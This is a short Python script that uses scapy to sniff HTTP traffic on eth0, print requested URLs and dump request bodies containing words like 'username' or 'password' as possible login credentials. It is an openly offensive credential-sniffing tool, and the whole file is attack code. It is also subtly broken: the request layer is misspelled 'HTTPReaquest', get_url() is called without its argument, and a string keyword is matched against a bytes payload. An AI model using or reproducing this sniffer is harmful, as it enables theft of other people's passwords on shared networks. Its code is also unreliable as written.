#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniffing(interface):
    scapy.sniff(iface=interface, store=False ,prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPReaquest].Host+packet[http.HTTPReaquest].Path

def get_login_info(packet):
    if packet.haslayer(http.HTTPReaquest):
        if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load

            keywords=["username","usr","password","pass"]

            for key in keywords:
                if key in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPReaquest):
        url=get_url()
        print("[+]HTTP Reaquest>> "+url)

        login_info=get_login_info(packet)

        if login_info:
            print("\n\n[+]Possible username/Passwords>> "+login_info+"\n\n")


sniffing("eth0")